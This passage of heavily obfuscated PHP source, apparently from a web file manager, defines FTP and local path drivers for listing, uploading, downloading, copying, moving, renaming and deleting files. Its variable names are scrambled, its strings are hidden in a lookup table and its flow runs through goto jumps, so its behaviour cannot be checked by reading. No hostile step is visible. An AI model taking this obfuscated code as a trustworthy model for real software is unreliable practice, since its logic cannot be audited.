$F×âæ•Ô§, $bœ¯Â„¾§, $e‚œøó•î»); } continue; } $bœ¯Â„¾§[] = $DÃ”Œ¥­³; goto f¾Øèô–œÔ; fÍßğ¨İ¸‘: if (substr($fî¤„‹Ëì÷, 0, 1) == $B¬·› ¿±ñ[1229]) { $DÃ”Œ¥­³[$B¬·› ¿±ñ[29]] = $B¬·› ¿±ñ[76]; $DÃ”Œ¥­³[$B¬·› ¿±ñ[77]] = 0; } $f›¾±™‘®¿ = $DÃ”Œ¥­³[$B¬·› ¿±ñ[29]] == $B¬·› ¿±ñ[76] ? !0 : !1; if ($bˆçÈºƒî¦) { $this->cacheMethod($B¬·› ¿±ñ[197], $Aˆñ¶ƒ¢é, $f›¾±™‘®¿); $this->cacheMethod($B¬·› ¿±ñ[198], $Aˆñ¶ƒ¢é, $DÃ”Œ¥­³); } goto eø†àî†Å; f¾Øèô–œÔ: } if ($bˆçÈºƒî¦) { $this->cacheMethod($B¬·› ¿±ñ[197], $d„ÑÖóš¿ª, !0); } goto CÈ¨¾Íç–; D¿½ÕœÓé: $B¬·› ¿±ñ =& $_SERVER[¹…ÕÄ]; $d„ÑÖóš¿ª = $this->iconvSystem($d„ÑÖóš¿ª); if (!$this->isFolder($d„ÑÖóš¿ª)) { return !1; } goto Cì®¥ŒñÜ—; CÈ¨¾Íç–: } private function _listItem($D ¸Ëä›«¯) { if (empty($D ¸Ëä›«¯)) { return array(); } $fîÉö…ÏöÛ = preg_split($_SERVER[¹…ÕÄ][1230], $D ¸Ëä›«¯); if (count($fîÉö…ÏöÛ) <= 9) { return $fîÉö…ÏöÛ; } $fîÉö…ÏöÛ[8] = trim(substr($D ¸Ëä›«¯, strpos($D ¸Ëä›«¯, $fîÉö…ÏöÛ[7]) + strlen($fîÉö…ÏöÛ[7]))); return array_splice($fîÉö…ÏöÛ, 0, 9); } public function listPath($DÎÛŠã©Ö‹, $D†Äàœ³© = false) { goto D»«½î…„ã; D»«½î…„ã: $DÍŒòèŞõÊ =& $_SERVER[¹…ÕÄ]; if (!$this->_isconn()) { return !1; } $bÊ÷‡Ç˜È÷ = $aÖ›í°Å = array(); goto Aò˜Ã”ùÒ; BÔİİ´»ç: return array($DÍŒòèŞõÊ[74] => $bÊ÷‡Ç˜È÷, $DÍŒòèŞõÊ[73] => $aÖ›í°Å); goto D‘†ŞË²ËÇ; Aò˜Ã”ùÒ: $this->fileList($DÎÛŠã©Ö‹, $bÊ÷‡Ç˜È÷, $aÖ›í°Å); foreach ($bÊ÷‡Ç˜È÷ as $fìö½ë„óÓ => $FÄÇ¥„³‚) { $bÊ÷‡Ç˜È÷[$fìö½ë„óÓ] = $this->folderInfo($FÄÇ¥„³‚, $D†Äàœ³©); } foreach ($aÖ›í°Å as $fìö½ë„óÓ => $FÄÇ¥„³‚) { $aÖ›í°Å[$fìö½ë„óÓ] = $this->fileInfo($FÄÇ¥„³‚[$DÍŒòèŞõÊ[28]], $D†Äàœ³©, $FÄÇ¥„³‚); } goto BÔİİ´»ç; D‘†ŞË²ËÇ: } public function has($d±â›æ°ëŠ, $bÑáÀÙ»ò = false, $FØáÆ¯ø‘ = true) { goto c®ªø‚Ó; b±¹ˆ©Û³: $this->fileList($d±â›æ°ëŠ, $bÌ›Å‚Çæ«, $eŠ›˜Ôá, $F·­¡ùÈ…©); if ($bÑáÀÙ»ò) { return array($Fö“ƒëŠ¦[201] => count($eŠ›˜Ôá), $Fö“ƒëŠ¦[202] => count($bÌ›Å‚Çæ«)); } if ($FØáÆ¯ø‘) { if (count($eŠ›˜Ôá)) { return !0; } } else { if (count($bÌ›Å‚Çæ«)) { return !0; } } goto añæ˜‡·³ƒ; c®ªø‚Ó: $Fö“ƒëŠ¦ =& $_SERVER[¹…ÕÄ]; $bÌ›Å‚Çæ« = $eŠ›˜Ôá = array(); $F·­¡ùÈ…© = $bÑáÀÙ»ò ? !0 : !1; goto b±¹ˆ©Û³; añæ˜‡·³ƒ: return !1; goto dĞ¬¡‹ëÁğ; dĞ¬¡‹ëÁğ: } public function listAll($D£šæà”ÙÍ) { goto aˆÍàéƒßÍ; F›¯´œšË: foreach ($a¥‡×İ¦ñ as $Dë‹Ÿ†Äó) { if (is_string($Dë‹Ÿ†Äó)) { $F“‡ñ«È¡[$Dë‹Ÿ†Äó] = 0; } } return $this->listAllFiles($D£šæà”ÙÍ, array_keys($F“‡ñ«È¡), $F“‡ñ«È¡); goto EùòŠİİã; E´ÜÏää˜‡: $this->fileList($D£šæà”ÙÍ, $a¥‡×İ¦ñ, $CÑªÍŞ™–, !0); $F“‡ñ«È¡ = array(); foreach ($CÑªÍŞ™– as $Dë‹Ÿ†Äó) { $F“‡ñ«È¡[$Dë‹Ÿ†Äó[$CĞ¾œŠëÜ[28]]] = $Dë‹Ÿ†Äó[$CĞ¾œŠëÜ[77]]; } goto F›¯´œšË; aˆÍàéƒßÍ: $CĞ¾œŠëÜ =& $_SERVER[¹…ÕÄ]; if (!$this->_isconn()) { return !1; } $a¥‡×İ¦ñ = $CÑªÍŞ™– = array(); goto E´ÜÏää˜‡; EùòŠİİã: } public function getContent($fÎ©Õ¶çÉÙ) { if (!$this->_isconn()) { return !1; } $fÎ©Õ¶çÉÙ = $this->iconvSystem($fÎ©Õ¶çÉÙ); return $this->fileSubstr($fÎ©Õ¶çÉÙ); } public function setContent($A±‹µ«Öò¡, $e–Ï‰…— = '') { goto a¸Ù•½ÀˆÔ; EÙãÔ¼”Ú: file_put_contents($A¾¾„Ï¯Ó³, $e–Ï‰…—); $Aƒõ§ÈÓ Ğ = $this->upload($A±‹µ«Öò¡, $this->iconvApp($A¾¾„Ï¯Ó³)); $this->tempFileRemve($A¾¾„Ï¯Ó³); goto bª–å‰„¹; bª–å‰„¹: return $Aƒõ§ÈÓ Ğ; goto F¢¥”½·œî; a¸Ù•½ÀˆÔ: if (!$this->_isconn()) { return !1; } $føÓ‹Û®áÉ = $this->pathThis($this->iconvSystem($A±‹µ«Öò¡)); $A¾¾„Ï¯Ó³ = $this->tempFile($føÓ‹Û®áÉ); goto EÙãÔ¼”Ú; F¢¥”½·œî: } public function fileSubstr($D£¥×ôõÕ, $Bà—Ü“¶šâ = 0, $Dá™ÍßÊ½ƒ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D£¥×ôõÕ, $Bà—Ü“¶šâ, $Dá™ÍßÊ½ƒ); } private function ftpRequest($B¯Ù×Š¥Ü«, $bÍâøàŠ‰¥ = 0, $EÔİî¶Õ×ö = false) { goto D—àà´ÉÆ; BøƒÆ ç: return $bÊ°¥í‰Ÿ; goto FÌİÕä²‚; D—àà´ÉÆ: $B¯Ù×Š¥Ü« = $this->iconvSystem($B¯Ù×Š¥Ü«); $cæÇÈø™íª = $this->scheme . $this->host . $_SERVER[¹…ÕÄ][4] . $this->port; $BÈ¬àÉ´ËÎ = curl_init(); goto eœğ„Éä–—; C¶ÖŠ–àÔß: curl_setopt($BÈ¬àÉ´ËÎ, CURLOPT_RETURNTRANSFER, 1); $bÊ°¥í‰Ÿ = curl_exec($BÈ¬àÉ´ËÎ); curl_close($BÈ¬àÉ´ËÎ); goto BøƒÆ ç; eœğ„Éä–—: curl_setopt($BÈ¬àÉ´ËÎ, CURLOPT_URL, $cæÇÈø™íª . $this->pathEncode($B¯Ù×Š¥Ü«)); curl_setopt($BÈ¬àÉ´ËÎ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($EÔİî¶Õ×ö) { $b®½¿Ø–åÊ = $bÍâøàŠ‰¥ + $EÔİî¶Õ×ö - 1; curl_setopt($BÈ¬àÉ´ËÎ, CURLOPT_RANGE, "{$bÍâøàŠ‰¥}\55{$b®½¿Ø–åÊ}"); } goto C¶ÖŠ–àÔß; FÌİÕä²‚: } public function upload($fÇ´·İè‘Ò, $E‰İ•¾¹–¿, $BÃÇĞ½ìô… = false, $AÏœœõù‚Ô = REPEAT_REPLACE) { goto dÜï¼¢™í; f•š¾ÆÓóÈ: $E‰İ•¾¹–¿ = $this->iconvSystem($E‰İ•¾¹–¿); $a™Ñ²ñàºœ = ftp_nb_put($this->connect, $fÇ´·İè‘Ò, $E‰İ•¾¹–¿, FTP_BINARY); while ($a™Ñ²ñàºœ == FTP_MOREDATA) { $a™Ñ²ñàºœ = ftp_nb_continue($this->connect); } goto e×õ÷‰™Ò; dÜï¼¢™í: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($fÇ´·İè‘Ò))) { return !1; } $fÇ´·İè‘Ò = $this->iconvSystem($fÇ´·İè‘Ò); goto f•š¾ÆÓóÈ; e×õ÷‰™Ò: if ($a™Ñ²ñàºœ != FTP_FINISHED) { return !1; } return $this->getPathOuter($fÇ´·İè‘Ò); goto Cà§á‰¤ä; Cà§á‰¤ä: } public function download($F¶˜î‰ìÔ•, $B„¡¹Ñóíµ = '') { goto eß–ğ¢ëÄø; eÔËØ‘ŞÂó: $F¶˜î‰ìÔ• = $this->iconvSystem($F¶˜î‰ìÔ•); $B„¡¹Ñóíµ = $this->iconvSystem($B„¡¹Ñóíµ); $BÁ„¢Å¹İ = ftp_nb_get($this->connect, $B„¡¹Ñóíµ, $F¶˜î‰ìÔ•, FTP_BINARY); goto d´Æµ¥§; eß–ğ¢ëÄø: if (!$this->_isconn()) { return !1; } $bŸ¿˜¬íö÷ = $this->pathFather($B„¡¹Ñóíµ); if (!IO::mkdir($bŸ¿˜¬íö÷)) { return !1; } goto eÔËØ‘ŞÂó; d´Æµ¥§: while ($BÁ„¢Å¹İ == FTP_MOREDATA) { $BÁ„¢Å¹İ = ftp_nb_continue($this->connect); } if ($BÁ„¢Å¹İ != FTP_FINISHED) { return !1; } return $this->iconvApp($B„¡¹Ñóíµ); goto DÁåÚï­ª¹; DÁåÚï­ª¹: } public function exist($bÔóé¶å©) { return $this->isFile($bÔóé¶å©) || $this->isFolder($bÔóé¶å©); } public function isFile($cî­Š“­–) { return !$this->isFolder($cî­Š“­–) && $this->objectMeta($cî­Š“­–); } public function isFolder($dæ“ğ… Şâ) { return $this->cacheMethod($_SERVER[¹…ÕÄ][197], $dæ“ğ… Şâ); } protected function objectMeta($aŒ‡ÀƒÉŞî) { return $this->cacheMethod($_SERVER[¹…ÕÄ][198], $aŒ‡ÀƒÉŞî); } protected function _objectMeta($C»Ê‚Ú±³) { goto f¹£Íò†¼; f¹£Íò†¼: $a©Ú†ÜíãĞ =& $_SERVER[¹…ÕÄ]; if ($C»Ê‚Ú±³ == $a©Ú†ÜíãĞ[33] || $C»Ê‚Ú±³ == $a©Ú†ÜíãĞ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto e‹ì¥´ŠÊ; c±Ù‡ƒ—°à: $AÂÈº•—Ï = @ftp_size($this->connect, $C»Ê‚Ú±³); if ($AÂÈº•—Ï != -1) { $b…Á¾°¾Œ[$a©Ú†ÜíãĞ[77]] = $AÂÈº•—Ï; } else { $F‘ÄøøæğÜ = @ftp_chdir($this->connect, $C»Ê‚Ú±³); if (!$F‘ÄøøæğÜ) { return !1; } $b…Á¾°¾Œ[$a©Ú†ÜíãĞ[29]] = $a©Ú†ÜíãĞ[76]; } return $b…Á¾°¾Œ; goto A™¼ó÷‡ï; e‹ì¥´ŠÊ: $C»Ê‚Ú±³ = $this->iconvSystem($C»Ê‚Ú±³); $b…Á¾°¾Œ = array($a©Ú†ÜíãĞ[28] => $this->iconvApp($C»Ê‚Ú±³), $a©Ú†ÜíãĞ[29] => $a©Ú†ÜíãĞ[173], $a©Ú†ÜíãĞ[77] => 0); @ftp_chdir($this->connect, $a©Ú†ÜíãĞ[8]); goto c±Ù‡ƒ—°à; A™¼ó÷‡ï: } protected function _isFolder($EÕ¼†Ü›‡Š) { $F´³Úš =& $_SERVER[¹…ÕÄ]; if ($EÕ¼†Ü›‡Š == $F´³Úš[33] || $EÕ¼†Ü›‡Š == $F´³Úš[8]) { return !0; } $f™‹ÒôÄˆÙ = $this->_objectMeta($EÕ¼†Ü›‡Š); return isset($f™‹ÒôÄˆÙ[$F´³Úš[29]]) && $f™‹ÒôÄˆÙ[$F´³Úš[29]] == $F´³Úš[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fù—è·…ó) { if (substr($fù—è·…ó, 0, 2) == $_SERVER[¹…ÕÄ][1221]) { $fù—è·…ó = BASIC_PATH . substr($fù—è·…ó, 2); } return $fù—è·…ó; } public function iconvApp($e¶ãå·©) { $F‹÷é³Ê“õ =& $_SERVER[¹…ÕÄ]; global $config; return $this->iconvTo($e¶ãå·©, $config[$F‹÷é³Ê“õ[1219]], $config[$F‹÷é³Ê“õ[1218]]); } public function iconvSystem($eµµŞ­ªŒ–) { $CƒÆêÈÛ„ =& $_SERVER[¹…ÕÄ]; global $config; return $this->iconvTo($eµµŞ­ªŒ–, $config[$CƒÆêÈÛ„[1218]], $config[$CƒÆêÈÛ„[1219]]); } public function getPathOuter($b‚©¶ˆø™) { goto A”ÖÇ±Ñä„; FÛµæ‘¿½¡: if (substr($fÆŒÊø¢İ, 0, 2) == $båÆ¸–Öù[1221]) { $fÆŒÊø¢İ = BASIC_PATH . substr($fÆŒÊø¢İ, 2); } if (substr($b‚©¶ˆø™, 0, 2) == $båÆ¸–Öù[1221]) { $b‚©¶ˆø™ = BASIC_PATH . substr($b‚©¶ˆø™, 2); } $fÆŒÊø¢İ = KodIO::clear($fÆŒÊø¢İ); goto F‡íµëÑ»Š; cÖ§Ïì¢óà: return $this->pathDriver . $båÆ¸–Öù[8] . ltrim($b‚©¶ˆø™, $båÆ¸–Öù[8]); goto F¾æ‘‹¾Çˆ; F‡íµëÑ»Š: $b‚©¶ˆø™ = KodIO::clear($b‚©¶ˆø™); $b‚©¶ˆø™ = substr($b‚©¶ˆø™, strlen($fÆŒÊø¢İ)); if (empty($this->pathDriver)) { return $b‚©¶ˆø™; } goto cÖ§Ïì¢óà; A”ÖÇ±Ñä„: $båÆ¸–Öù =& $_SERVER[¹…ÕÄ]; $fÆŒÊø¢İ = $this->iconvApp($this->pathBase); $b‚©¶ˆø™ = $this->iconvApp($b‚©¶ˆø™); goto FÛµæ‘¿½¡; F¾æ‘‹¾Çˆ: } public function mkfile($A«äÂˆ §è, $f¦’„İ§Ü = '', $F¿¦ø®ï = REPEAT_RENAME) { $A«äÂˆ §è = $this->iconvSystem($A«äÂˆ §è); @touch($A«äÂˆ §è); if ($f¦’„İ§Ü) { file_put_contents($A«äÂˆ §è, $f¦’„İ§Ü); } return is_file($A«äÂˆ §è) ? $this->getPathOuter($A«äÂˆ §è) : !1; } public function mkdir($cÖî„‡øƒó, $fùŠ–¢Ê = REPEAT_SKIP) { $cÖî„‡øƒó = $this->iconvSystem($cÖî„‡øƒó); if (is_dir($cÖî„‡øƒó)) { return $this->getPathOuter($cÖî„‡øƒó); } @mkdir($cÖî„‡øƒó, 511, !0); return is_dir($cÖî„‡øƒó) ? $this->getPathOuter($cÖî„‡øƒó) : !1; } public function copyFile($d®”ïÎÉÀö, $aÄò‰–·Ÿ†) { $this->mkdir($this->pathFather($aÄò‰–·Ÿ†)); $d®”ïÎÉÀö = $this->iconvSystem($d®”ïÎÉÀö); $aÄò‰–·Ÿ† = $this->iconvSystem($aÄò‰–·Ÿ†); $DÚå‚ÉğÍƒ = copy_64($d®”ïÎÉÀö, $aÄò‰–·Ÿ†); return $DÚå‚ÉğÍƒ ? $this->getPathOuter($aÄò‰–·Ÿ†) : !1; } public function moveFile($a‚ì£®®†Š, $e‘»“ƒ²ø) { $this->mkdir($this->pathFather($e‘»“ƒ²ø)); $a‚ì£®®†Š = $this->iconvSystem($a‚ì£®®†Š); $e‘»“ƒ²ø = $this->iconvSystem($e‘»“ƒ²ø); $FîÔË©½¦Ï = intval(@rename($a‚ì£®®†Š, $e‘»“ƒ²ø)); if (!$FîÔË©½¦Ï) { if ($FîÔË©½¦Ï = intval(@copy_64($a‚ì£®®†Š, $e‘»“ƒ²ø))) { @unlink($a‚ì£®®†Š); } } return $FîÔË©½¦Ï ? $this->getPathOuter($e‘»“ƒ²ø) : !1; } public function delFile($BàÎ±ï‰Ü–) { $BàÎ±ï‰Ü– = $this->iconvSystem($BàÎ±ï‰Ü–); if (!@unlink($BàÎ±ï‰Ü–)) { @chmod($BàÎ±ï‰Ü–, 511); if (!@unlink($BàÎ±ï‰Ü–)) { return !1; } } else { return !0; } } public function delFolder($dÚ‹‚š¹•Ş) { goto D×©¦ÁÕé–; D»«×á§ ì: if (!($eéÁ¢Û‹óó = opendir($dÚ‹‚š¹•Ş))) { return !1; } while (($b°‘ÉìÙäš = readdir($eéÁ¢Û‹óó)) !== !1) { if ($b°‘ÉìÙäš == $AçÌÛ•¡É‘[94] || $b°‘ÉìÙäš == $AçÌÛ•¡É‘[1228]) { continue; } $b‹ïİ•³  = $dÚ‹‚š¹•Ş . $AçÌÛ•¡É‘[8] . $b°‘ÉìÙäš; if (is_file($b‹ïİ•³ ) || is_link($b‹ïİ•³ )) { if (!unlink($b‹ïİ•³ )) { chmod($b‹ïİ•³ , 511); if (!unlink($b‹ïİ•³ )) { return !1; } } } else { if (is_dir($b‹ïİ•³ )) { chmod($b‹ïİ•³ , 511); $b‹ïİ•³  = $this->iconvApp($b‹ïİ•³ ); if (!$this->delFolder($b‹ïİ•³ )) { return !1; } } } } closedir($eéÁ¢Û‹óó); goto dà³“ªÈ£Ø; D×©¦ÁÕé–: $AçÌÛ•¡É‘ =& $_SERVER[¹…ÕÄ]; $dÚ‹‚š¹•Ş = $this->iconvSystem($dÚ‹‚š¹•Ş); if (!is_dir($dÚ‹‚š¹•Ş)) { return !0; } goto D»«×á§ ì; dà³“ªÈ£Ø: return rmdir($dÚ‹‚š¹•Ş); goto f¡Ñ£Şæ¢; f¡Ñ£Şæ¢: } public function rename($B¨šÅ›¢Œ, $DÕ‘äÇ¼Û) { goto F†¨Ÿï±²Ô; Dà£µà´‰å: $B¨šÅ›¢Œ = $this->iconvSystem($B¨šÅ›¢Œ); $dæ³Å¦¹¤á = $this->pathFather($B¨šÅ›¢Œ); $cğÅ¢Û‚¥† = rtrim($dæ³Å¦¹¤á, $F†ñ¢Şµò³[8]) . $F†ñ¢Şµò³[8] . $cÈË¯¿½÷Õ; goto Aå¯‚í¦æÍ; F†¨Ÿï±²Ô: $F†ñ¢Şµò³ =& $_SERVER[¹…ÕÄ]; $cÈË¯¿½÷Õ = $this->fileNameAuto($this->pathFather($B¨šÅ›¢Œ), $DÕ‘äÇ¼Û); $cÈË¯¿½÷Õ = $this->iconvSystem($cÈË¯¿½÷Õ); goto Dà£µà´‰å; Aå¯‚í¦æÍ: $CØèäÉ¤Ğ— = @rename($B¨šÅ›¢Œ, $cğÅ¢Û‚¥†); $cğÅ¢Û‚¥† = $this->iconvApp($cğÅ¢Û‚¥†); return $CØèäÉ¤Ğ— ? $this->getPathOuter($cğÅ¢Û‚¥†) : !1; goto AæçÉÓ†Øò; AæçÉÓ†Øò: } public function size($eª»ˆ’àÙå) { $eª»ˆ’àÙå = $this->iconvSystem($eª»ˆ’àÙå); return filesize_64($eª»ˆ’àÙå); } public function info($a³‰ªäòä) { $a³‰ªäòä = $this->iconvSystem($a³‰ªäòä); if ($this->isFolder($a³‰ªäòä)) { return $this->folderInfo($a³‰ªäòä); } else { if ($this->isFile($a³‰ªäòä)) { return $this->fileInfo($a³‰ªäòä); } } return !1; } protected function infoChildren($Càí¿ŠŒ¢¹, &$B¹¼¿ˆæ—, $DÅÁ¬†ÅëÍ = true) { goto DöÕÔáÍÇ; a©…Â™½®Ô: if ($DÅÁ¬†ÅëÍ) { $Càí¿ŠŒ¢¹ = $this->iconvSystem($Càí¿ŠŒ¢¹); } if (!($c†ÏêÍùéÚ = @opendir($Càí¿ŠŒ¢¹))) { return; } while (($F ×õ¼è‰ó = readdir($c†ÏêÍùéÚ)) !== !1) { if ($F ×õ¼è‰ó == $aˆçóöÛÅ®[94] || $F ×õ¼è‰ó == $aˆçóöÛÅ®[1228]) { continue; } $a¡À·££ŸÙ = $Càí¿ŠŒ¢¹ . $F ×õ¼è‰ó; if (is_file($a¡À·££ŸÙ) || is_link($a¡À·££ŸÙ)) { $B¹¼¿ˆæ—[$aˆçóöÛÅ®[78]]++; $B¹¼¿ˆæ—[$aˆçóöÛÅ®[77]] += filesize_64($a¡À·££ŸÙ); } else { if (is_dir($a¡À·££ŸÙ)) { $B¹¼¿ˆæ—[$aˆçóöÛÅ®[79]]++; $this->infoChildren($a¡À·££ŸÙ, $B¹¼¿ˆæ—, !1); } } } goto BÌÂª‹¾Ü¡; BÌÂª‹¾Ü¡: closedir($c†ÏêÍùéÚ); goto A±ˆËÌÃËÃ; DöÕÔáÍÇ: $aˆçóöÛÅ® =& $_SERVER[¹…ÕÄ]; check_abort_echo(); $Càí¿ŠŒ¢¹ = rtrim($Càí¿ŠŒ¢¹, $aˆçóöÛÅ®[8]) . $aˆçóöÛÅ®[8]; goto a©…Â™½®Ô; A±ˆËÌÃËÃ: } private function folderInfo($a±Ñ†×“ƒ², $bò•¡ÈÂ½Õ = false) { $aŒ÷ùøÅçŞ =& $_SERVER[¹…ÕÄ]; $a±Ñ†×“ƒ² = rtrim($a±Ñ†×“ƒ², $aŒ÷ùøÅçŞ[8]) . $aŒ÷ùøÅçŞ[8]; $A¾¯ŠîĞÎ² = $this->iconvApp($this->pathThis($a±Ñ†×“ƒ²)); if ($bò•¡ÈÂ½Õ) { return array($aŒ÷ùøÅçŞ[28] => $A¾¯ŠîĞÎ², $aŒ÷ùøÅçŞ[75] => $this->getPathOuter($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[29] => $aŒ÷ùøÅçŞ[76]); } $F™¢­ÛÄæ˜ = array($aŒ÷ùøÅçŞ[28] => $A¾¯ŠîĞÎ², $aŒ÷ùøÅçŞ[75] => $this->getPathOuter($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[29] => $aŒ÷ùøÅçŞ[76], $aŒ÷ùøÅçŞ[192] => @filectime($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[83] => @filemtime($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[1231] => @fileatime($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[1232] => is_readable($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[1233] => is_writable($a±Ñ†×“ƒ²), $aŒ÷ùøÅçŞ[1234] => get_mode($a±Ñ†×“ƒ²)); return $F™¢­ÛÄæ˜; } private function fileInfo($FÓ¬óéö‘, $dá†Ğ‚çŞã = false) { $c„ì‘ŒµÕ¢ =& $_SERVER[¹…ÕÄ]; $CËÎ¹¾×÷‹ = $this->iconvApp($this->pathThis($FÓ¬óéö‘)); if ($dá†Ğ‚çŞã) { return array($c„ì‘ŒµÕ¢[28] => $CËÎ¹¾×÷‹, $c„ì‘ŒµÕ¢[75] => $this->getPathOuter($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[29] => $c„ì‘ŒµÕ¢[173], $c„ì‘ŒµÕ¢[77] => $this->size($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[167] => $this->ext($CËÎ¹¾×÷‹)); } $D­ù¸¤Í¸§ = array($c„ì‘ŒµÕ¢[28] => $CËÎ¹¾×÷‹, $c„ì‘ŒµÕ¢[75] => $this->getPathOuter($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[29] => $c„ì‘ŒµÕ¢[173], $c„ì‘ŒµÕ¢[192] => @filectime($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[83] => @filemtime($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[1231] => @fileatime($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[77] => $this->size($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[167] => $this->ext($CËÎ¹¾×÷‹), $c„ì‘ŒµÕ¢[1232] => is_readable($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[1233] => is_writable($FÓ¬óéö‘), $c„ì‘ŒµÕ¢[1234] => get_mode($FÓ¬óéö‘)); return $D­ù¸¤Í¸§; } public function exist($B…¼ÉÏŞÂğ) { $B…¼ÉÏŞÂğ = $this->iconvSystem($B…¼ÉÏŞÂğ); return @file_exists($B…¼ÉÏŞÂğ); } public function isFile($f½òã†ÔÒ¾) { $f½òã†ÔÒ¾ = $this->iconvSystem($f½òã†ÔÒ¾); return @is_file($f½òã†ÔÒ¾); } public function isFolder($AšßİÈšåÄ) { $AšßİÈšåÄ = $this->iconvSystem($AšßİÈšåÄ); return @is_dir($AšßİÈšåÄ); } public function listPath($aĞç³É¹¾, $c«òœèŒ§ğ = false) { goto E‚»¥Ù¹ÓÈ; A†’¥“ŠïÇ: $dÅ³å®§Ùˆ = array($D‰ÉŸ£öÈ[74] => array(), $D‰ÉŸ£öÈ[73] => array()); if (!($DÅ¤Ê¹ˆ­× = @opendir($aĞç³É¹¾))) { return $dÅ³å®§Ùˆ; } while (($B¯æ³÷„ßò = readdir($DÅ¤Ê¹ˆ­×)) !== !1) { if ($B¯æ³÷„ßò == $D‰ÉŸ£öÈ[94] || $B¯æ³÷„ßò == $D‰ÉŸ£öÈ[1228]) { continue; } $eÎãÖ½‰ = $aĞç³É¹¾ . $B¯æ³÷„ßò; if (is_file($eÎãÖ½‰)) { $dÅ³å®§Ùˆ[$D‰ÉŸ£öÈ[73]][] = $this->fileInfo($eÎãÖ½‰, $c«òœèŒ§ğ); } else { $dÅ³å®§Ùˆ[$D‰ÉŸ£öÈ[74]][] = $this->folderInfo($eÎãÖ½‰, $c«òœèŒ§ğ); } } goto B‡ŠíƒÁÜè; B‡ŠíƒÁÜè: closedir($DÅ¤Ê¹ˆ­×); return $dÅ³å®§Ùˆ; goto bÁ®±ª¶õ; E‚»¥Ù¹ÓÈ: $D‰ÉŸ£öÈ =& $_SERVER[¹…ÕÄ]; $aĞç³É¹¾ = $this->iconvSystem($aĞç³É¹¾); $aĞç³É¹¾ = rtrim($aĞç³É¹¾, $D‰ÉŸ£öÈ[8]) . $D‰ÉŸ£öÈ[8]; goto A†’¥“ŠïÇ; bÁ®±ª¶õ: } public function listAll($AË¨óÄãŠ, &$EÕÌÚÙÎö = array()) { goto Dæäªíñ»î; A­öĞ«‡¸±: return $EÕÌÚÙÎö; goto f×¶­”Ç²¹; Dæäªíñ»î: $EˆÈ¬³à¡Ø =& $_SERVER[¹…ÕÄ]; $AË¨óÄãŠ = $this->iconvSystem($AË¨óÄãŠ); $AË¨óÄãŠ = rtrim($AË¨óÄãŠ, $EˆÈ¬³à¡Ø[8]) . $EˆÈ¬³à¡Ø[8]; goto A‹¥áÔ†ªí; A‹¥áÔ†ªí: if (!($d°ÎĞ¨‰® = @opendir($AË¨óÄãŠ))) { return $EÕÌÚÙÎö; } while (($cÃÆİù’å = readdir($d°ÎĞ¨‰®)) !== !1) { if ($cÃÆİù’å == $EˆÈ¬³à¡Ø[94] || $cÃÆİù’å == $EˆÈ¬³à¡Ø[1228]) { continue; } $C°·Ï©É²ó = $AË¨óÄãŠ . $cÃÆİù’å; if (is_dir($C°·Ï©É²ó) && !is_link($C°·Ï©É²ó)) { $EÕÌÚÙÎö[] = array($EˆÈ¬³à¡Ø[75] => $C°·Ï©É²ó . $EˆÈ¬³à¡Ø[8], $EˆÈ¬³à¡Ø[76] => 1, $EˆÈ¬³à¡Ø[83] => @filemtime($C°·Ï©É²ó), $EˆÈ¬³à¡Ø[77] => 0); $this->listAll($C°·Ï©É²ó, $EÕÌÚÙÎö); } else { $EÕÌÚÙÎö[] = array($EˆÈ¬³à¡Ø[75] => $C°·Ï©É²ó, $EˆÈ¬³à¡Ø[76] => 0, $EˆÈ¬³à¡Ø[83] => @filemtime($C°·Ï©É²ó), $EˆÈ¬³à¡Ø[77] => $this->size($C°·Ï©É²ó)); } } closedir($d°ÎĞ¨‰®); goto A­öĞ«‡¸±; f×¶­”Ç²¹: } public function has($Fêà§é¢Çİ, $AŞ¤‡š½É = false, $fíªÛ”¥ó­ = true) { goto e¡œ‚¤Ì¨ì; A¿š…‘î×ï: $B­¦±†Íô™ = 0; while (($FµÙ‘•Ó‹ƒ = readdir($cò»ó‡Çµ†)) !== !1) { if ($FµÙ‘•Ó‹ƒ == $bïÑŸ¶ŒÖ[94] || $FµÙ‘•Ó‹ƒ == $bïÑŸ¶ŒÖ[1228]) { continue; } $FŠÀÊ±ÜëÔ = $Fêà§é¢Çİ . $FµÙ‘•Ó‹ƒ; if ($AŞ¤‡š½É) { $B­¦±†Íô™++; if (@is_file($FŠÀÊ±ÜëÔ)) { $cŞ¤ª‡Ÿà++; } else { $eŠ·”Éµ++; } if ($B­¦±†Íô™ > 10000) { break; } continue; } if ($fíªÛ”¥ó­) { if (@is_file($FŠÀÊ±ÜëÔ)) { return !0; } } else { if (@is_dir($FŠÀÊ±ÜëÔ . $bïÑŸ¶ŒÖ[8])) { return !0; } } } closedir($cò»ó‡Çµ†); goto a•¥Î‘×ß˜; FÓæ¦è—¬ç: if (!($cò»ó‡Çµ† = @opendir($Fêà§é¢Çİ))) { return !1; } $cŞ¤ª‡Ÿà = 0; $eŠ·”Éµ = 0; goto A¿š…‘î×ï; a•¥Î‘×ß˜: if ($AŞ¤‡š½É) { return array($bïÑŸ¶ŒÖ[201] => $cŞ¤ª‡Ÿà, $bïÑŸ¶ŒÖ[202] => $eŠ·”Éµ); } return !1; goto FÎÏÍÚ‡ùÂ; e¡œ‚¤Ì¨ì: $bïÑŸ¶ŒÖ =& $_SERVER[¹…ÕÄ]; $Fêà§é¢Çİ = $this->iconvSystem($Fêà§é¢Çİ); $Fêà§é¢Çİ = rtrim($Fêà§é¢Çİ, $bïÑŸ¶ŒÖ[8]) . 